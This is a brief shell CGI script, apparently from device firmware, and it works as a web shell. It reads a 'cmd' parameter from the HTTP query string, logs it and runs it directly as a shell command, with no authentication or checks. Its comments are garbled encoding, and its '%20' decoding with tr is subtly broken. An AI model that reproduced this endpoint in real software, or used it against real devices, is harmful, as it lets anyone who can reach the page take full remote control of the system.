#!/bin/sh
. /usr/syscfg/api_log.sh
cmd=`echo ${QUERY_STRING} | cut -d = -f 3` #ȡ��cmd=���������
cmd=`echo ${cmd} |tr "%20" " "` #��%02ת���ɿո�

TGP_Log ${TGP_LOG_WARNING} "cmd=${cmd}"
${cmd} #��������

echo  "Content-type: text/html"
echo  ""